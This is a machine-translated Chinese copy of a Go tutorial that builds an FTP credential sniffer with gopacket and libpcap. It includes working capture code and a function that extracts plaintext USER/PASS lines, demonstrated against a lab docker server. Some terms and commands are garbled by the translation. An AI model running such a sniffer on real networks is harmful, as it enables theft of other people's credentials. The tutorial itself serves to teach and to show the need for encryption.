<html>
<head>
<title>Sniffing Creds with Go, A Journey with libpcap</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">用Go嗅信用，用libpcap走一趟</h1>
<blockquote>原文：<a href="https://itnext.io/sniffing-creds-with-go-a-journey-with-libpcap-73bc3e74966?source=collection_archive---------0-----------------------#2020-11-30">https://itnext.io/sniffing-creds-with-go-a-journey-with-libpcap-73bc3e74966?source=collection_archive---------0-----------------------#2020-11-30</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/26ac2fb70e4257d8fc1e7c3a257c57f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2gbh8Nkc6szR7pqMaceYrQ.png"/></div></div></figure><p id="480b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在过去，要编写一个凭证嗅探器，你必须花很多时间学习C和libpcap，这是非常耗时的，没有人真的想经历这些。</p><p id="a865" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">所以今天我们有了GoLang，google的静态类型语言，特别是google的gopacket库。</p></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><p id="cc75" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">Gopacket是一个引入包过滤和捕获的库。它附带了libpcap的C绑定、pfring的C绑定、afpacket C绑定和tcpassembly。</p><h1 id="18fb" class="lg lh it bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">在开始之前</h1><p id="3bd0" class="pw-post-body-paragraph kb kc it kd b ke me kg kh ki mf kk kl km mg ko kp kq mh ks kt ku mi kw kx ky im bi translated">在我们继续之前，我们需要安装一些东西，以及golang ( <a class="ae mj" href="https://golang.org/doc/install" rel="noopener ugc nofollow" target="_blank">使用您选择的安装方法</a>)和libpcap(带有开发库)</p><blockquote class="mk ml mm"><p id="7ff3" class="kb kc mn kd b ke kf kg kh ki kj kk kl mo kn ko kp mp kr ks kt mq kv kw kx ky im bi translated">fedora/RHEL/CentOS等… <br/> $ sudo dnf安装libpcap libpcap-devel<br/>Ubuntu/Debian/Kali/Parrot<br/>$ sudo apt更新&amp; &amp; sudo apt安装libpcap-dev</p></blockquote><p id="1e10" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在我们有了我们的dep，我们可以开始了</p><h1 id="c3dc" class="lg lh it bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">对包裹的剖析</h1><p id="e438" class="pw-post-body-paragraph kb kc it kd b ke me kg kh ki mf kk kl km mg ko kp kq mh ks kt ku mi kw kx ky im bi translated">在本教程中，我们将针对通过网络以纯文本形式发送的FTP凭据。我们可以使用tcpdump查看我们的目标流量。</p><p id="2484" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">tcpdump在我们的命令行中打印出数据包的描述。我们可以使用BPF (Berkely包过滤)语法来定位TCP端口21。一旦tcpdump运行，您就可以使用您选择的客户机连接到FTP服务器(我使用的是命令行FTP客户机</p><blockquote class="mk ml mm"><p id="3e96" class="kb kc mn kd b ke kf kg kh ki kj kk kl mo kn ko kp mp kr ks kt mq kv kw kx ky im bi translated">$ sudo tcpdump tcp和port 21<br/>dropped privs to tcpdump<br/>…<br/>00:17:09.312853 IP<strong class="kd iu">&lt;客户端&gt; </strong> .44860 &gt; <strong class="kd iu"> &lt;服务器&gt; </strong>。ftp: Flags [P.]，seq 1:28，ack 321，win 501，options [nop，nop，TS val 4275069681 ecr 3350561499]，length 27: FTP: <strong class="kd iu">用户&lt;用户名&gt;</strong><br/>00:17:20.938293 IP<strong class="kd iu">&lt;客户端&gt;</strong>44860&gt;ftp: Flags [P.]，seq 28:52，ack 374，win 501，options [nop，nop，TS val 4275081307 ecr 3350567300]，长度24: FTP: <strong class="kd iu"> PASS &lt;密码&gt; </strong></p></blockquote><p id="816e" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">查看TCP Dump的输出，我们可以看到数据包中的大量信息。然而，我们真正感兴趣的是客户端(src)、服务器(dst)和有效负载(突出显示的用户和通行证部分)。</p><p id="b904" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">要了解更多关于Tcpdump输出的信息，请查看这个<a class="ae mj" href="https://packetpushers.net/masterclass-tcpdump-interpreting-output/" rel="noopener ugc nofollow" target="_blank">大师班</a>。</p><h1 id="e811" class="lg lh it bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">让我们开始编码</h1><p id="d3c3" class="pw-post-body-paragraph kb kc it kd b ke me kg kh ki mf kk kl km mg ko kp kq mh ks kt ku mi kw kx ky im bi translated">为了便于说明，我们使用的所有变量都将被硬编码，如果您愿意，您可以对应用程序进行参数化。</p><h2 id="337a" class="mr lh it bd li ms mt dn lm mu mv dp lq km mw mx lu kq my mz ly ku na nb mc nc bi translated">安装</h2><p id="5759" class="pw-post-body-paragraph kb kc it kd b ke me kg kh ki mf kk kl km mg ko kp kq mh ks kt ku mi kw kx ky im bi translated">但是让我们从声明iface、buffer和filter变量开始。</p><p id="673a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">如果接口是我们的接口，我的FTP服务器在docker中运行，所以我在我的docker接口上嗅探流量。</p><p id="0f4c" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">buffer变量是我们的1600字节的缓冲区大小，这应该足以捕获各种大小的TCP包</p><p id="344a" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">该过滤器是我们的BPF过滤器，您可以更改它以匹配您将与TCPDump一起使用的任何过滤器</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="722e" class="mr lh it ni b gy nm nn l no np">var (<br/>  iface = “docker0”<br/>  buffer = int32(1600)<br/>  filter = “tcp and port 21”<br/>)</span></pre><p id="7ae0" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在我们需要包含一些库，大多数来自go标准库，但是我们需要google/gopacket和google/gopacket/pcap</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="da52" class="mr lh it ni b gy nm nn l no np">import (<br/>  "bytes"<br/>  "fmt"<br/>  "log"</span><span id="0bbc" class="mr lh it ni b gy nq nn l no np">  "github.com/google/gopacket"<br/>  "github.com/google/gopacket/pcap"<br/>)</span></pre><h2 id="492d" class="mr lh it bd li ms mt dn lm mu mv dp lq km mw mx lu kq my mz ly ku na nb mc nc bi translated">检测我们的界面</h2><p id="39e0" class="pw-post-body-paragraph kb kc it kd b ke me kg kh ki mf kk kl km mg ko kp kq mh ks kt ku mi kw kx ky im bi translated">在我们开始捕获流量之前，我们需要检测我们的接口是否存在于系统中。为此，我们可以使用<a class="ae mj" href="https://pkg.go.dev/github.com/google/gopacket@v1.1.19/pcap#FindAllDevs" rel="noopener ugc nofollow" target="_blank"> pcap循环遍历我们的设备。FindAllDevs() </a>为了找到接口变量中定义的名称的匹配，所以让我们创建一个deviceExists bool函数</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="7a88" class="mr lh it ni b gy nm nn l no np">func deviceExists(name string) bool {<br/>  devices, err := pcap.FindAllDevs()</span><span id="354f" class="mr lh it ni b gy nq nn l no np">  if err != nil {<br/>    log.Panic(err)<br/>  }</span><span id="8f01" class="mr lh it ni b gy nq nn l no np">  for _, device := range devices {<br/>    if device.Name == name {<br/>     return true<br/>    }<br/>  }<br/>  return false<br/>}</span></pre><p id="e799" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在我们可以在if语句中调用它，作为main()函数的一部分</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="335d" class="mr lh it ni b gy nm nn l no np">func main() {<br/>  if !deviceExists(iface) {<br/>    log.Fatal("Unable to open device ", iface)<br/>  }<br/>}</span></pre><p id="e086" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">如果您在iface var中定义了一个不存在的接口，当您使用go run运行代码时，您将会得到一个致命错误，应用程序将会退出。</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="b92d" class="mr lh it ni b gy nm nn l no np">$ go run main.go<br/>2020/11/30 20:05:04 Unable to open device docker1<br/>exit status 1</span></pre><h2 id="91ea" class="mr lh it bd li ms mt dn lm mu mv dp lq km mw mx lu kq my mz ly ku na nb mc nc bi translated">捕获数据包</h2><p id="7754" class="pw-post-body-paragraph kb kc it kd b ke me kg kh ki mf kk kl km mg ko kp kq mh ks kt ku mi kw kx ky im bi translated">现在我们知道我们的接口存在，我们可以继续捕获数据包。为此，我们需要使用pcap打开一个实时的数据包流。这是使用<a class="ae mj" href="https://pkg.go.dev/github.com/google/gopacket@v1.1.19/pcap#OpenLive" rel="noopener ugc nofollow" target="_blank"> pcap完成的。OpenLive </a>我们可以在设备检查后将它添加到我们的主函数中。</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="7404" class="mr lh it ni b gy nm nn l no np">handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)</span><span id="0dee" class="mr lh it ni b gy nq nn l no np">if err != nil {<br/>  log.Fatal(err)<br/>}<br/>defer handler.Close()</span></pre><p id="6041" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">用于打开界面的参数有:</p><ul class=""><li id="612e" class="nr ns it kd b ke kf ki kj km nt kq nu ku nv ky nw nx ny nz bi translated">接口名称</li><li id="9ab0" class="nr ns it kd b ke oa ki ob km oc kq od ku oe ky nw nx ny nz bi translated">缓冲区大小(快照长度)</li><li id="663e" class="nr ns it kd b ke oa ki ob km oc kq od ku oe ky nw nx ny nz bi translated"><a class="ae mj" href="https://en.wikipedia.org/wiki/Promiscuous_mode" rel="noopener ugc nofollow" target="_blank">滥交模式</a></li><li id="1484" class="nr ns it kd b ke oa ki ob km oc kq od ku oe ky nw nx ny nz bi translated">超时(<a class="ae mj" href="https://pkg.go.dev/github.com/google/gopacket@v1.1.19/pcap#BlockForever." rel="noopener ugc nofollow" target="_blank"> 10毫秒</a>)</li></ul><p id="8f51" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在我们可以使用<a class="ae mj" href="https://pkg.go.dev/github.com/google/gopacket@v1.1.19/pcap#Handle.SetBPFFilter" rel="noopener ugc nofollow" target="_blank"> pcap设置我们的BPF滤波器。Handle.SetBPFFilter </a>方法</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="b8cf" class="mr lh it ni b gy nm nn l no np">if err := handler.SetBPFFilter(filter); err != nil {<br/>  log.Fatal(err)<br/>}</span></pre><p id="ff2b" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在我们使用gopacket设置我们的包源，这是我们如何在一个循环中解析我们的包</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="01d3" class="mr lh it ni b gy nm nn l no np">source := gopacket.NewPacketSource(handler, handler.LinkType())<br/>for packet := range source.Packets() {<br/>  fmt.Println(packet)<br/>}</span></pre><p id="1814" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在，您可以使用sudo运行这段代码，并尝试验证您的目标FTP服务器</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="23a4" class="mr lh it ni b gy nm nn l no np">$ sudo go run main.go</span><span id="4837" class="mr lh it ni b gy nq nn l no np">PACKET: 80 bytes, wire length 80 cap length 80 @ 2020-11-30 20:21:33.007534 +0000 GMT<br/>- Layer 1 (14 bytes) = Ethernet {Contents=[..14..] Payload=[..66..] SrcMAC=02:42:9a:92:0a:55 DstMAC=02:42:ac:11:00:02 EthernetType=IPv4 Length=0}<br/>- Layer 2 (20 bytes) = IPv4 {Contents=[..20..] Payload=[..46..] Version=4 IHL=5 TOS=16 Length=66 Id=51609 Flags=DF FragOffset=0 TTL=64 Protocol=TCP Checksum=6375 SrcIP=172.17.0.1 DstIP=172.17.0.2 Options=[] Padding=[]}<br/>- Layer 3 (32 bytes) = TCP {Contents=[..32..] Payload=[..14..] SrcPort=33748 DstPort=21(ftp) Seq=3778718902 Ack=277870828 DataOffset=8 FIN=false SYN=false RST=false PSH=true ACK=true URG=false ECE=false CWR=false NS=false Window=502 Checksum=22618 Urgent=0 Options=[TCPOption(NOP:), TCPOption(NOP:), TCPOption(Timestamps:2890546481/2237472386 0xac4a3d31855d1e82)] Padding=[]}<br/>- Layer 4 (14 bytes) = Payload 14 byte(s)</span><span id="db6a" class="mr lh it ni b gy nq nn l no np">PACKET: 66 bytes, wire length 66 cap length 66 @ 2020-11-30 20:21:33.007561 +0000 GMT</span></pre><p id="d4a0" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">您可能同意这个输出几乎没有什么用处。所以让我们让它更有用一点。</p><h2 id="1d13" class="mr lh it bd li ms mt dn lm mu mv dp lq km mw mx lu kq my mz ly ku na nb mc nc bi translated">收集凭据</h2><p id="f2d4" class="pw-post-body-paragraph kb kc it kd b ke me kg kh ki mf kk kl km mg ko kp kq mh ks kt ku mi kw kx ky im bi translated">从我们的TCP转储示例开始，我们讨论了如何使用TCP转储查看每个数据包中的用户和传递有效负载。我们可以使用这里的应用程序来简化这一过程。如果我们创建一个新的harvestFTPCreds函数。</p><p id="2603" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">该函数需要做的第一件事是使用<a class="ae mj" href="https://pkg.go.dev/github.com/google/gopacket@v1.1.19#Packet.ApplicationLayer" rel="noopener ugc nofollow" target="_blank">数据包确认应用层对数据包可用。ApplicationLayer() </a>，否则我们将在某个时候得到一个segfault</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="3ceb" class="mr lh it ni b gy nm nn l no np">func harvestFTPCreds(packet gopacket.Packet) {<br/>  app := packet.ApplicationLayer()<br/>  if app != nil {<br/>    // App is present<br/>  }<br/>}</span></pre><p id="d9d8" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在我们可以提取我们的<a class="ae mj" href="https://pkg.go.dev/github.com/google/gopacket@v1.1.19#ApplicationLayer.Payload" rel="noopener ugc nofollow" target="_blank">有效载荷</a>和<a class="ae mj" href="https://pkg.go.dev/github.com/google/gopacket@v1.1.19#Flow.Dst" rel="noopener ugc nofollow" target="_blank">目的IP </a>地址</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="8b55" class="mr lh it ni b gy nm nn l no np">if app != nil {<br/>  payload := app.Payload()<br/>  dst := packet.NetworkLayer().NetworkFlow().Dst()<br/>}</span></pre><p id="96e2" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">最后一部分是检查有效载荷是否包含我们的用户或使用字节传递。包含()</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="5fac" class="mr lh it ni b gy nm nn l no np">if app != nil {<br/>...<br/>  if bytes.Contains(payload, []byte("USER")) {<br/>    fmt.Print(dst, "  -&gt;  ", string(payload))<br/>  } else if bytes.Contains(payload, []byte("PASS")) {<br/>    fmt.Print(dst, " -&gt; ", string(payload))<br/>  }<br/>}</span></pre><p id="ff73" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">现在我们的harvest函数完成了，我们可以返回到我们的main函数并替换fmt。使用我们新的收割功能进行打印。</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="ae89" class="mr lh it ni b gy nm nn l no np">for packet := range source.Packets() {<br/>  harvestFTPCreds(packet)<br/>}</span></pre><p id="69ca" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">如果我们现在运行我们的代码，我们应该已经为我们的FTP服务器从网络接口嗅到了格式良好的用户/口令组合。</p><pre class="nd ne nf ng gt nh ni nj nk aw nl bi"><span id="7d29" class="mr lh it ni b gy nm nn l no np">$ sudo go run main.go<br/>172.17.0.2  -&gt;  USER ftpuser<br/>172.17.0.2 -&gt; PASS ftppassword</span></pre><h1 id="3305" class="lg lh it bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">结论</h1><p id="eae7" class="pw-post-body-paragraph kb kc it kd b ke me kg kh ki mf kk kl km mg ko kp kq mh ks kt ku mi kw kx ky im bi translated">我希望这已经提供了丰富的信息，并展示了使用golang作为一种简单有效的方法来捕获、过滤和嗅探实时网络流量是多么容易。</p><p id="4f6e" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">我也希望这已经告诉了一点关于加密网络流量的重要性:)</p><p id="d821" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">感谢阅读这里是完整的源代码</p><p id="6731" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated"><a class="ae mj" href="https://gist.github.com/affix/51daf036faf68593fb6d87af9eba1f0f" rel="noopener ugc nofollow" target="_blank">https://gist . github . com/affix/51 daf 036 faf 68593 fb6d 87 af 9 EBA 1 f 0f</a></p></div></div>    
</body>
</html>